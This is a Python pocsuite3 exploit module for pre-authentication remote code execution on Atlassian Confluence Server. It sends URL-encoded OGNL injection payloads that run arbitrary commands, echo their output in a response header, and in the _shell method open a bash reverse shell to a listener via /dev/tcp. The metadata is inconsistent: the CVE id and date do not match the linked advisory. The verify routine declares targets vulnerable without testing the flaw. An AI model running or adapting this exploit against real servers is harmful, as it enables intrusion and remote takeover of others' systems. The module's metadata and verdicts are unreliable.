from unittest import result
from pocsuite3.api import requests, register_poc, POCBase, OptString, Output
from collections import OrderedDict
from pocsuite3.api import REVERSE_PAYLOAD, get_listener_ip, get_listener_port
import re
import urllib3
import urllib.parse
from bs4 import BeautifulSoup
import requests
from requests.exceptions import RequestException

urllib3.disable_warnings()

class ConfluenceRCE(POCBase):
    vulID = 'CVE-2022-26123'
    version = '1.1'
    author = 'None'
    vulDate = '2022-03-07'
    createDate = '2023-09-01'
    updateDate = '2023-09-01'
    references = ['https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html']
    name = 'Confluence Pre-Auth Command Injection RCE'
    appPowerLink = 'https://www.atlassian.com/software/confluence'
    appName = 'Atlassian Confluence Server'
    appVersion = 'All LTS <= 7.13.6 and all others <= 7.18.0'
    vulType = 'Remote Code Execution (RCE)'
    desc = 'Exploits CVE-2022-26123 to achieve remote code execution on Confluence Server.'
    samples = []
    install_requires = []

    def __init__(self):
        super().__init__()
        self._app_version = ''

    def _options(self):
        o = OrderedDict()
        o['cmd'] = OptString('', description='Command to execute')
        return o

    def check_target_version(self):
        try:
            response = requests.get("{}/login.action".format(self.url), verify=False, timeout=8)
            if response.status_code == 200:
                filter_version = re.findall("<span id='footer-build-information'>.*</span>", response.text)

                if len(filter_version) >= 1:
                    version = filter_version[0].split("'>")[1].split('</')[0]
                    return version
                else:
                    return False
            else:
                return False
        except:
            return False

    def send_payload(self,host,command):
        payload = "%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22{}%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D".format(command)
        response = requests.get("{}/{}/".format(host, payload), verify=False, allow_redirects=False)
        try:
            if response.status_code == 302:
                return response.headers["X-Cmd-Response"]
            else:
                return "This target does not seem to be vulnerable."
        except:
            return "This target does not seem to be vulnerable."

    def _verify(self):
        result ={}
        version = self.check_target_version()
        if version:
            result['Version'] = version
            result['Message'] = "Target is vulnerable"
            return self.parse_output(result)
        else:
            result['Message'] = "Target is not vulnerable or offline."
            return self.parse_output(result)

    def _attack(self):
        result = {}
        host = self.url
        command = self.get_option('cmd')
        exec_payload = self.send_payload(host, command)
        cmd = self.get_options().get('cmd')
        result['Command'] = cmd.value
        result['Message']=exec_payload
        return self.parse_output(result)

    def _shell(self):
        lhost = get_listener_ip()
        lport = get_listener_port()
        exploit = '${Class.forName("com.opensymphony.webwork.ServletActionContext").getMethod("getResponse",null).invoke(null,null).setHeader("", Class.forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command(\'bash\',\'-c\',\'bash -i >& /dev/tcp/' + lhost + '/' + str(lport) + ' 0>&1\').start()"))}'
        payload = urllib.parse.quote(exploit)
        response = requests.get("{}/{}/".format(self.target, payload), verify=False, allow_redirects=False)


    def parse_output(self, result):
        self.result = result
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Exploit failed')
        return output

register_poc(ConfluenceRCE)
